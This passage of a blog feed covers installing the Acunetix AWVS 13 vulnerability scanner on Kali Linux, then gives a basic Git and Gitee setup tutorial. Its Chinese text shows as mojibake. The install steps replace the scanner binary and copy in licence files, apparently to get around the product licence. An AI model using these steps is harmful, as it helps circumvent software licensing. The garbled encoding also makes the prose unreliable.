class="bash"> sudo cp wa_data.dat /home/acunetix/.acunetix/data/license</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /home/acunetix/.acunetix/data/license</span><br></code></pre></td></tr></table></figure><h2 id="Kali-Linux-2021-2-å®‰è£…-AWVS13"><a href="#Kali-Linux-2021-2-å®‰è£…-AWVS13" class="headerlink" title="Kali Linux 2021.2 å®‰è£… AWVS13"></a>Kali Linux 2021.2 å®‰è£… AWVS13</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> unzip AWVS13_linux.zip</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> chmod +x acunetix_13.0.200217097_x64_.sh</span> <br><span class="hljs-meta">$</span><span class="bash"> sudo ./acunetix_13.0.200217097_x64_.sh</span><br>Accept the license terms? [yes|no]<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; yes</span> <br><br>    Hostname [AJESTdeKALI]:<br><br>    Email: ajest@dnsec.com.cn<br>    Password: abc123!@#<br>    Password again: abc123!@#<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp -rf wvsc /home/acunetix/.acunetix/v_200217097/scanner/</span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp license_info.json /home/acunetix/.acunetix/data/license/</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo systemctl restart acunetix</span><br><span class="hljs-meta">$</span><span class="bash"> sudo systemctl <span class="hljs-built_in">disable</span> acunetix.service</span> <br></code></pre></td></tr></table></figure><h2 id="Kali-Linux-2020-4-å®‰è£…-AWVS"><a href="#Kali-Linux-2020-4-å®‰è£…-AWVS" class="headerlink" title="Kali Linux 2020.4 å®‰è£… AWVS"></a>Kali Linux 2020.4 å®‰è£… AWVS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">Kali-Linux-2020.4-vmware-amd64<br></code></pre></td></tr></table></figure><ul><li>å‘½ä»¤</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> unzip AWVS13_linux.zip</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> awvs13-linux/</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo chmod +x *</span><br><span class="hljs-meta">$</span><span class="bash"> sudo ./acunetix_13.0.200217097_x64_.sh</span><br><br>    Hostname [kali]:<br><br>Configuring the master user...<br>    Email: ajest@kali.org<br>    Password: abc123!@#<br>    Password again: abc123!@#<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp -rf wvsc /home/acunetix/.acunetix/v_200217097/scanner/</span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp license_info.json /home/acunetix/.acunetix/data/license/</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo systemctl restart acunetix</span><br></code></pre></td></tr></table></figure><ul><li>web ç™»å½•</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://127.0.0.1:3443/<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Kali</tag>
      
      <tag>AWVS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git-Giteeåˆæ­¥é…ç½®åŠä½¿ç”¨</title>
    <link href="/2021/07/27/Tools/Git/Git-Gitee%E5%88%9D%E6%AD%A5%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/07/27/Tools/Git/Git-Gitee%E5%88%9D%E6%AD%A5%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>Git</strong> æ˜¯ä¸€ä¸ªå¼€æºçš„<strong>åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶</strong>ç³»ç»Ÿï¼Œç”¨äºæ•æ·é«˜æ•ˆåœ°å¤„ç†ä»»ä½•æˆ–å°æˆ–å¤§çš„é¡¹ç›®ã€‚</p><p><strong>Gitee</strong> æ˜¯å¼€æºä¸­å›½ï¼ˆOSChinaï¼‰æ¨å‡ºçš„<strong>åŸºäº Git</strong> çš„<strong>ä»£ç æ‰˜ç®¡æœåŠ¡</strong>ï¼Œæä¾›å…è´¹çš„ Git ä»“åº“ã€‚</p><p><strong>Git</strong> æ–‡æ¡£ï¼š<a href="https://git-scm.com/book/zh/v2">Git - Book (git-scm.com)</a></p><p><strong>Gitee</strong> å¸®åŠ©æ–‡æ¡£ï¼š<a href="https://gitee.com/help">Gitee å¸®åŠ©ä¸­å¿ƒ - Gitee.com</a></p><h2 id="ä¸€ã€ç”¨æˆ·ä¿¡æ¯é…ç½®"><a href="#ä¸€ã€ç”¨æˆ·ä¿¡æ¯é…ç½®" class="headerlink" title="ä¸€ã€ç”¨æˆ·ä¿¡æ¯é…ç½®"></a>ä¸€ã€ç”¨æˆ·ä¿¡æ¯é…ç½®</h2><p>ç¬¬ä¸€ä¸ªè¦é…ç½®çš„æ˜¯ä½ ä¸ªäººçš„ç”¨æˆ·åç§°å’Œç”µå­é‚®ä»¶åœ°å€ã€‚è¿™ä¸¤æ¡é…ç½®å¾ˆé‡è¦ï¼Œæ¯æ¬¡ Git æäº¤æ—¶éƒ½ä¼šå¼•ç”¨è¿™ä¸¤æ¡ä¿¡æ¯ï¼Œè¯´æ˜æ˜¯è°æäº¤äº†æ›´æ–°ï¼Œæ‰€ä»¥ä¼šéšæ›´æ–°å†…å®¹ä¸€èµ·è¢«æ°¸ä¹…çº³å…¥å†å²è®°å½•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git config --global user.name <span class="hljs-string">&quot;John&quot;</span><br>$ git config --global user.email john@example.com<br></code></pre></td></tr></table></figure><p>å¦‚æœç”¨äº† <code>--global</code> é€‰é¡¹ï¼Œé‚£ä¹ˆæ›´æ”¹çš„é…ç½®æ–‡ä»¶å°±æ˜¯ä½äºä½ ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„é‚£ä¸ªï¼Œä»¥åä½ æ‰€æœ‰çš„ä»“åº“éƒ½ä¼šé»˜è®¤ä½¿ç”¨è¿™é‡Œé…ç½®çš„ç”¨æˆ·ä¿¡æ¯ã€‚å¦‚æœè¦åœ¨æŸä¸ªç‰¹å®šçš„ä»“åº“ä¸­ä½¿ç”¨å…¶ä»–åå­—æˆ–è€…ç”µé‚®ï¼Œåªè¦å»æ‰ <code>--global</code> é€‰é¡¹é‡æ–°é…ç½®å³å¯ï¼Œæ–°çš„è®¾å®šä¿å­˜åœ¨å½“å‰ä»“åº“çš„ <code>.git/config</code> æ–‡ä»¶é‡Œã€‚</p><h2 id="äºŒã€æ•°æ®ä¼ è¾“åè®®"><a href="#äºŒã€æ•°æ®ä¼ è¾“åè®®" class="headerlink" title="äºŒã€æ•°æ®ä¼ è¾“åè®®"></a>äºŒã€æ•°æ®ä¼ è¾“åè®®</h2><p>Git å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å››ç§åè®®è¿›è¡Œèµ„æ–™çš„ä¼ è¾“ï¼š</p><ul><li>æœ¬åœ°åè®®ï¼ˆLocalï¼‰</li><li>HTTP/HTTPS åè®®</li><li>SSHï¼ˆSecure Shellï¼‰åè®®</li><li>git åè®®</li></ul><p>å…¶ä¸­ï¼Œæœ¬åœ°åè®®ç”±äºç›®å‰å¤§éƒ½æ˜¯è¿›è¡Œè¿œç¨‹å¼€å‘å’Œå…±äº«ä»£ç æ‰€ä»¥ä¸€èˆ¬ä¸å¸¸ç”¨ï¼Œè€Œ <code>git åè®®</code> ç”±äºç¼ºä¹æˆæƒæœºåˆ¶ä¸”è¾ƒéš¾æ¶è®¾æ‰€ä»¥ä¹Ÿä¸å¸¸ç”¨ã€‚</p><p>ç›®å‰ Gitee æ”¯æŒä½¿ç”¨ <code>HTTPSåè®®</code> å’Œ <code>ssh åè®®</code> è¿›è¡Œä»£ç çš„æ¨é€/æ‹‰å–ã€‚ä¸¤ç§åè®®çš„å·®åˆ«ä»…åœ¨äºåŒä¸€ä¸ªä»“åº“ä½¿ç”¨ä¸åŒåè®®æ—¶çš„åœ°å€ä¸åŒï¼Œä»¥åŠå¯¹åº”çš„æˆæƒå®ç°ä¸åŒã€‚</p><h3 id="1ã€HTTPS-ä¼ è¾“åè®®"><a href="#1ã€HTTPS-ä¼ è¾“åè®®" class="headerlink" title="1ã€HTTPS ä¼ è¾“åè®®"></a>1ã€HTTPS ä¼ è¾“åè®®</h3><p><strong>HTTPS</strong> åˆ©äºåŒ¿åè®¿é—®ï¼Œé€‚åˆå¼€æºé¡¹ç›®å¯ä»¥æ–¹ä¾¿è¢«åˆ«äººå…‹éš†å’Œè¯»å–ï¼ˆ ä½†ä»–æ²¡æœ‰ <code>push</code> æƒé™ ï¼‰ã€‚</p><p>å½“è‡ªå·±è¦è¿›è¡Œ <code>push</code> æ“ä½œæ—¶ï¼Œæ¯æ¬¡éƒ½éœ€è¦æˆ‘ä»¬è¿›è¡Œç”¨æˆ·åå’Œå¯†ç çš„éªŒè¯ã€‚</p><p>å½“ç„¶ï¼Œä¸ºé¿å…æ¯æ¬¡éƒ½è¾“å…¥å¯†ç ï¼Œå¯ä»¥é…ç½®å®¢æˆ·ç«¯è®°ä½å¯†ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git config --global credential.helper store<br></code></pre></td></tr></table></figure><h3 id="2ã€SSH-ä¼ è¾“åè®®"><a href="#2ã€SSH-ä¼ è¾“åè®®" class="headerlink" title="2ã€SSH ä¼ è¾“åè®®"></a>2ã€SSH ä¼ è¾“åè®®</h3><p><strong>SSH</strong> åè®®ä½¿ç”¨å…¬é’¥è®¤è¯æ¯”è¾ƒé€‚åˆå†…éƒ¨é¡¹ç›®ã€‚</p><p>ä½¿ç”¨ <strong>SSH</strong> è¿›è¡Œæ•°æ®ä¼ è¾“æ—¶ï¼Œä¸å†éœ€è¦æ¯æ¬¡éªŒè¯å¯†ç ï¼Œä½†éœ€è¦æå‰ç”Ÿæˆå¹¶åœ¨<strong>æœåŠ¡å™¨ç«¯</strong>æ·»åŠ  <strong>SSH</strong> å…¬é’¥ã€‚</p><h4 id="1ï¼‰ç”Ÿæˆ-SSH-å…¬é’¥"><a href="#1ï¼‰ç”Ÿæˆ-SSH-å…¬é’¥" class="headerlink" title="1ï¼‰ç”Ÿæˆ SSH å…¬é’¥"></a>1ï¼‰ç”Ÿæˆ SSH å…¬é’¥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh-keygen -t rsa -C <span class="hljs-string">&quot;xxxxx@xxxxx.com&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šè¿™é‡Œçš„ <code>xxxxx@xxxxx.com</code> åªæ˜¯ç”Ÿæˆçš„ ssh-key çš„åç§°ï¼Œå¹¶ä¸çº¦æŸæˆ–è¦æ±‚å…·ä½“å‘½åä¸ºæŸä¸ªé‚®ç®±ã€‚<br>ç°ç½‘çš„å¤§éƒ¨åˆ†æ•™ç¨‹å‡è®²è§£çš„ä½¿ç”¨é‚®ç®±ç”Ÿæˆï¼Œå…¶ä¸€å¼€å§‹çš„åˆè¡·ä»…ä»…æ˜¯ä¸ºäº†ä¾¿äºè¾¨è¯†æ‰€ä»¥ä½¿ç”¨äº†é‚®ç®±ã€‚</p></blockquote><p>æŒ‰ç…§æç¤ºå®Œæˆä¸‰æ¬¡å›è½¦ï¼Œå³å¯ç”Ÿæˆ ssh-keyã€‚</p><p>é€šè¿‡æŸ¥çœ‹ <code>~/.ssh/id_rsa.pub</code> æ–‡ä»¶å†…å®¹ï¼Œè·å– public keyã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cat ~/.ssh/id_rsa.pub<br></code></pre></td></tr></table></figure><h4 id="2ï¼‰é…ç½®ä»“åº“çš„-SSH-å…¬é’¥"><a href="#2ï¼‰é…ç½®ä»“åº“çš„-SSH-å…¬é’¥" class="headerlink" title="2ï¼‰é…ç½®ä»“åº“çš„ SSH å…¬é’¥"></a>2ï¼‰é…ç½®ä»“åº“çš„ SSH å…¬é’¥</h4><p>å¤åˆ¶ç”Ÿæˆåçš„ ssh-keyï¼Œé€šè¿‡ä»“åº“ä¸»é¡µ <strong>ã€Œç®¡ç†ã€-&gt;ã€Œéƒ¨ç½²å…¬é’¥ç®¡ç†ã€-&gt;ã€Œæ·»åŠ éƒ¨ç½²å…¬é’¥ã€</strong> ï¼Œæ·»åŠ ç”Ÿæˆçš„ public key æ·»åŠ åˆ°ä»“åº“ä¸­ã€‚</p><p>æ·»åŠ åï¼Œåœ¨ç»ˆç«¯ï¼ˆTerminalï¼‰ä¸­è¾“å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -T git@gitee.com<br></code></pre></td></tr></table></figure><p>é¦–æ¬¡ä½¿ç”¨éœ€è¦ç¡®è®¤å¹¶æ·»åŠ ä¸»æœºåˆ°æœ¬æœº SSH å¯ä¿¡åˆ—è¡¨ã€‚è‹¥è¿”å›ä»¥ä¸‹å†…å®¹ï¼Œåˆ™è¯æ˜æ·»åŠ æˆåŠŸã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hi XXX! You<span class="hljs-string">&#x27;ve successfully authenticated, but Gitee.com does not provide shell access.</span><br></code></pre></td></tr></table></figure><h4 id="3ï¼‰é…ç½®å¸æˆ·çš„-SSH-å…¬é’¥"><a href="#3ï¼‰é…ç½®å¸æˆ·çš„-SSH-å…¬é’¥" class="headerlink" title="3ï¼‰é…ç½®å¸æˆ·çš„ SSH å…¬é’¥"></a>3ï¼‰é…ç½®å¸æˆ·çš„ SSH å…¬é’¥</h4><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸»é¡µå³ä¸Šè§’ <strong>ã€Œä¸ªäººè®¾ç½®ã€-&gt;ã€Œå®‰å…¨è®¾ç½®ã€-&gt;ã€ŒSSHå…¬é’¥ã€-&gt;ã€Œ<a href="https://gitee.com/profile/sshkeys">æ·»åŠ å…¬é’¥</a>ã€</strong> ï¼Œå°†ä¸Šé¢ç”Ÿæˆçš„ public key æ·»åŠ åˆ°å½“å‰è´¦æˆ·ä¸­ã€‚</p><h4 id="4ï¼‰ä»“åº“çš„-SSH-Key-å’Œè´¦æˆ·-SSH-Key-çš„åŒºåˆ«"><a href="#4ï¼‰ä»“åº“çš„-SSH-Key-å’Œè´¦æˆ·-SSH-Key-çš„åŒºåˆ«" class="headerlink" title="4ï¼‰ä»“åº“çš„ SSH Key å’Œè´¦æˆ· SSH Key çš„åŒºåˆ«"></a>4ï¼‰ä»“åº“çš„ SSH Key å’Œè´¦æˆ· SSH Key çš„åŒºåˆ«</h4><ul><li>ä»“åº“çš„ SSH Key å…·æœ‰ä¸”åªæœ‰ <strong>â€œåªè¯»â€</strong> æƒé™ï¼Œå³åªèƒ½ <code>clone</code> ä¸èƒ½ <code>push</code></li><li>è´¦æˆ·çš„ SSH Key åŒæ—¶å…·å¤‡<code>clone</code> å’Œ <code>push</code> çš„æƒé™ï¼Œå¯¹ç”¨æˆ·åˆ›å»º/å‚ä¸çš„ä»“åº“å‡èƒ½ä½¿ç”¨ï¼Œä½¿ç”¨èµ·æ¥æ›´åŠ æ–¹ä¾¿ã€‚</li></ul><blockquote><p>ä»“åº“çš„ ssh-key åªé’ˆå¯¹ä»“åº“ï¼Œä¸”æˆ‘ä»¬ä»…å¯¹ä»“åº“æä¾›äº†éƒ¨ç½²å…¬é’¥ï¼Œå³<strong>ä»“åº“ä¸‹çš„å…¬é’¥ä»…èƒ½æ‹‰å–ä»“åº“</strong>ï¼Œè¿™é€šå¸¸ç”¨äºç”Ÿäº§æœåŠ¡å™¨æ‹‰å–ä»“åº“çš„ä»£ç ã€‚<br>è€Œç”¨æˆ·çš„ ssh-key åˆ™æ˜¯é’ˆå¯¹ç”¨æˆ·çš„ï¼Œç”¨æˆ·æ·»åŠ äº† key å°±å¯¹ç”¨æˆ·åä¸‹çš„ä»“åº“å’Œç”¨æˆ·å‚åŠ äº†çš„ä»“åº“å…·æœ‰æƒé™ï¼Œä¸€èˆ¬è€Œè¨€ï¼Œ<strong>ç”¨æˆ·çš„ key å…·æœ‰æ¨é€å’Œæ‹‰å–çš„æƒé™</strong>ï¼Œ<strong>è€Œä»“åº“çš„ key åˆ™åªå…·æœ‰æ‹‰å–æƒé™</strong>ã€‚</p></blockquote><p>æ‰€ä»¥ï¼Œè¿™é‡Œå»ºè®®ç”Ÿæˆ SSH å…¬é’¥åç›´æ¥é…ç½®å¸æˆ·çš„ SSH å…¬é’¥ã€‚</p><h3 id="3ã€HTTPS-å’Œ-SSH-è¯´æ˜"><a href="#3ã€HTTPS-å’Œ-SSH-è¯´æ˜" class="headerlink" title="3ã€HTTPS å’Œ SSH è¯´æ˜"></a>3ã€HTTPS å’Œ SSH è¯´æ˜</h3><ul><li><p><strong>SSH</strong> åªèƒ½å¯¹è‡ªå·±åˆ›å»ºçš„ä»“åº“æˆ–è€… <strong>Fork</strong> åˆ°è‡ªå·±åä¸‹çš„ä»“åº“è¿›è¡Œ <code>cloneã€push</code>ï¼ˆ æ¨é€å’Œæ‹‰å– ï¼‰ï¼Œå› æ­¤ï¼Œ <strong>å¦‚æœç”¨æˆ·æƒ³è¦ä½¿ç”¨ SSH å…‹éš†çš„è¯ï¼Œå¿…é¡»æ˜¯è¿™ä¸ªä»“åº“çš„æ‹¥æœ‰è€…</strong> ã€‚</p></li><li><p><strong>HTTPS</strong> å¯ä»¥å¯¹ä»»æ„ä»“åº“è¿›è¡Œ <code>clone</code> æ“ä½œï¼Œä½†æ³¨æ„å¯¹äºå…¶ä»–äººçš„ä»“åº“å¹¶æ²¡æœ‰ <code>push</code> çš„æƒé™ï¼Œå½“ç„¶å¯¹äºè‡ªå·±çš„ä»“åº“æ˜¯æœ‰ <code>push</code> çš„æƒé™çš„ï¼Œä¸è¿‡éœ€è¦æ¯æ¬¡è¾“å…¥éªŒè¯å¯†ç ï¼Œä½†å¯ä»¥é€šè¿‡å­˜å‚¨å¯†ç ï¼Œé¿å…æ¯æ¬¡è¾“å…¥ã€‚</p></li><li><p>æ€»çš„æ¥è¯´ï¼Œè‡ªå·±çš„ä»“åº“ç”¨å“ªä¸ªéƒ½å¯ä»¥ï¼Œçœ‹ä¸ªäººä¹ æƒ¯ï¼Œæˆ‘ä¸ªäººæ›´ä¹ æƒ¯ç”¨ <strong>SSH</strong> ï¼ˆä¸€å¼€å§‹æ ¹æ®è€å¸ˆçš„æ–‡æ¡£è®¾ç½®äº† <strong>SSH</strong>ï¼‰ï¼Œè€Œå…¶ä»–äººçš„ä»“åº“é€‚åˆç”¨ <strong>HTTPS</strong> ï¼ˆæ€»ä¸èƒ½ä¸ºäº†ç”¨ <strong>SSH</strong> è€Œå» <strong>Fork</strong> ä¸€ä¸ªä»“åº“å§ï¼‰ã€‚</p></li></ul><h2 id="ä¸‰ã€Git-ä»“åº“åŸºç¡€æ“ä½œ"><a href="#ä¸‰ã€Git-ä»“åº“åŸºç¡€æ“ä½œ" class="headerlink" title="ä¸‰ã€Git ä»“åº“åŸºç¡€æ“ä½œ"></a>ä¸‰ã€Git ä»“åº“åŸºç¡€æ“ä½œ</h2><h3 id="1ã€ä»“åº“åŸºæœ¬ç®¡ç†"><a href="#1ã€ä»“åº“åŸºæœ¬ç®¡ç†" class="headerlink" title="1ã€ä»“åº“åŸºæœ¬ç®¡ç†"></a>1ã€ä»“åº“åŸºæœ¬ç®¡ç†</h3><h4 id="1ï¼‰åˆå§‹åŒ–ä¸€ä¸ªGitä»“åº“"><a href="#1ï¼‰åˆå§‹åŒ–ä¸€ä¸ªGitä»“åº“" class="headerlink" title="1ï¼‰åˆå§‹åŒ–ä¸€ä¸ªGitä»“åº“"></a>1ï¼‰åˆå§‹åŒ–ä¸€ä¸ªGitä»“åº“</h4><p>ä»¥ <code>/home/gitee/test</code> æ–‡ä»¶å¤¹ä¸ºä¾‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> /home/gitee/<span class="hljs-built_in">test</span>    <span class="hljs-comment">#è¿›å…¥gitæ–‡ä»¶å¤¹</span><br>$ git init               <span class="hljs-comment">#åˆå§‹åŒ–ä¸€ä¸ªGitä»“åº“</span><br></code></pre></td></tr></table></figure><h4 id="2ï¼‰å°†æ–‡ä»¶æ·»åŠ åˆ°-Git-çš„æš‚å­˜åŒº"><a href="#2ï¼‰å°†æ–‡ä»¶æ·»åŠ åˆ°-Git-çš„æš‚å­˜åŒº" class="headerlink" title="2ï¼‰å°†æ–‡ä»¶æ·»åŠ åˆ° Git çš„æš‚å­˜åŒº"></a>2ï¼‰å°†æ–‡ä»¶æ·»åŠ åˆ° Git çš„æš‚å­˜åŒº</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git add <span class="hljs-string">&quot;readme.txt&quot;</span> <br></code></pre></td></tr></table></figure><p>æ³¨ï¼šä½¿ç”¨ <code>git add -A</code> æˆ– <code>git add .</code> å¯ä»¥æäº¤å½“å‰ä»“åº“çš„æ‰€æœ‰æ”¹åŠ¨ã€‚</p><h4 id="3ï¼‰ä»-Git-çš„æš‚å­˜åŒºæäº¤ç‰ˆæœ¬åˆ°ä»“åº“"><a href="#3ï¼‰ä»-Git-çš„æš‚å­˜åŒºæäº¤ç‰ˆæœ¬åˆ°ä»“åº“" class="headerlink" title="3ï¼‰ä» Git çš„æš‚å­˜åŒºæäº¤ç‰ˆæœ¬åˆ°ä»“åº“"></a>3ï¼‰ä» Git çš„æš‚å­˜åŒºæäº¤ç‰ˆæœ¬åˆ°ä»“åº“</h4><p>å‚æ•° <code>-m</code> åä¸ºå½“æ¬¡æäº¤çš„å¤‡æ³¨ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git commit -m <span class="hljs-string">&quot;1st commit&quot;</span><br></code></pre></td></tr></table></figure><h4 id="4ï¼‰å°†æœ¬åœ°çš„-Git-ä»“åº“ä¿¡æ¯æ¨é€ä¸Šä¼ åˆ°æœåŠ¡å™¨"><a href="#4ï¼‰å°†æœ¬åœ°çš„-Git-ä»“åº“ä¿¡æ¯æ¨é€ä¸Šä¼ åˆ°æœåŠ¡å™¨" class="headerlink" title="4ï¼‰å°†æœ¬åœ°çš„ Git ä»“åº“ä¿¡æ¯æ¨é€ä¸Šä¼ åˆ°æœåŠ¡å™¨"></a>4ï¼‰å°†æœ¬åœ°çš„ Git ä»“åº“ä¿¡æ¯æ¨é€ä¸Šä¼ åˆ°æœåŠ¡å™¨</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git push https://gitee.com/***/test.git<br></code></pre></td></tr></table></figure><h4 id="5ï¼‰æŸ¥çœ‹-Git-æäº¤çš„æ—¥å¿—"><a href="#5ï¼‰æŸ¥çœ‹-Git-æäº¤çš„æ—¥å¿—" class="headerlink" title="5ï¼‰æŸ¥çœ‹ Git æäº¤çš„æ—¥å¿—"></a>5ï¼‰æŸ¥çœ‹ Git æäº¤çš„æ—¥å¿—</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><h3 id="2ã€è¿œç¨‹ä»“åº“ç®¡ç†"><a href="#2ã€è¿œç¨‹ä»“åº“ç®¡ç†" class="headerlink" title="2ã€è¿œç¨‹ä»“åº“ç®¡ç†"></a>2ã€è¿œç¨‹ä»“åº“ç®¡ç†</h3><h4 id="1ï¼‰ä¿®æ”¹ä»“åº“å"><a href="#1ï¼‰ä¿®æ”¹ä»“åº“å" class="headerlink" title="1ï¼‰ä¿®æ”¹ä»“åº“å"></a>1ï¼‰ä¿®æ”¹ä»“åº“å</h4><p>ä¸€èˆ¬æ¥è®²ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨æ‰§è¡Œ <code>clone</code> æˆ–è€…å…¶ä»–æ“ä½œæ—¶ï¼Œä»“åº“åéƒ½æ˜¯ <strong>origin</strong> ï¼Œå¦‚æœè¯´æˆ‘ä»¬æƒ³ç»™ä»–æ”¹æ”¹åå­—ï¼Œæ¯”å¦‚æˆ‘ä¸å–œæ¬¢ <strong>origin</strong> è¿™ä¸ªåå­—ï¼Œæƒ³æ”¹ä¸º <strong>oschina</strong> ï¼Œé‚£ä¹ˆå°±è¦åœ¨ä»“åº“ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git remote rename origin oschina<br></code></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œä½ çš„è¿œç¨‹ä»“åº“åå­—å°±æ”¹æˆäº†<strong>oschina</strong>ï¼ŒåŒæ ·ï¼Œä»¥åæ¨é€æ—¶æ‰§è¡Œçš„å‘½ä»¤å°±ä¸å†æ˜¯ <code>git push origin master</code> è€Œæ˜¯ <code>git push oschina master</code> æ‹‰å–ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p><h4 id="2ï¼‰æ·»åŠ ä¸€ä¸ªä»“åº“"><a href="#2ï¼‰æ·»åŠ ä¸€ä¸ªä»“åº“" class="headerlink" title="2ï¼‰æ·»åŠ ä¸€ä¸ªä»“åº“"></a>2ï¼‰æ·»åŠ ä¸€ä¸ªä»“åº“</h4><p>åœ¨ä¸æ‰§è¡Œå…‹éš†æ“ä½œæ—¶ï¼Œå¦‚æœæƒ³å°†ä¸€ä¸ªè¿œç¨‹ä»“åº“æ·»åŠ åˆ°æœ¬åœ°çš„ä»“åº“ä¸­ï¼Œå¯ä»¥æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git remote add origin  ä»“åº“åœ°å€<br></code></pre></td></tr></table></figure><p>æ³¨æ„: </p><ul><li><p><strong>origin</strong> æ˜¯ä½ çš„ä»“åº“çš„åˆ«å å¯ä»¥éšä¾¿æ”¹ï¼Œä½†è¯·åŠ¡å¿…ä¸è¦ä¸å·²æœ‰çš„ä»“åº“åˆ«åå†²çª </p></li><li><p>ä»“åº“åœ°å€ä¸€èˆ¬æ¥è®²æ”¯æŒ <code>http/https/ssh/git</code> åè®®ï¼Œå…¶ä»–åè®®åœ°å€è¯·å‹¿æ·»åŠ </p></li></ul><h4 id="3ï¼‰æŸ¥çœ‹å½“å‰ä»“åº“å¯¹åº”çš„è¿œç¨‹ä»“åº“åœ°å€"><a href="#3ï¼‰æŸ¥çœ‹å½“å‰ä»“åº“å¯¹åº”çš„è¿œç¨‹ä»“åº“åœ°å€" class="headerlink" title="3ï¼‰æŸ¥çœ‹å½“å‰ä»“åº“å¯¹åº”çš„è¿œç¨‹ä»“åº“åœ°å€"></a>3ï¼‰æŸ¥çœ‹å½“å‰ä»“åº“å¯¹åº”çš„è¿œç¨‹ä»“åº“åœ°å€</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git remote -v<br></code></pre></td></tr></table></figure><p>è¿™æ¡å‘½ä»¤èƒ½æ˜¾ç¤ºä½ å½“å‰ä»“åº“ä¸­å·²ç»æ·»åŠ äº†çš„ä»“åº“åå’Œå¯¹åº”çš„ä»“åº“åœ°å€ï¼Œé€šå¸¸æ¥è®²ï¼Œä¼šæœ‰ä¸¤æ¡ä¸€æ¨¡ä¸€æ ·çš„è®°å½•ï¼Œåˆ†åˆ«æ˜¯ <code>fetch</code> å’Œ <code>push</code>ï¼Œå…¶ä¸­ <code>fetch</code> æ˜¯ç”¨æ¥ä»è¿œç¨‹åŒæ­¥ï¼Œ<code>push</code> 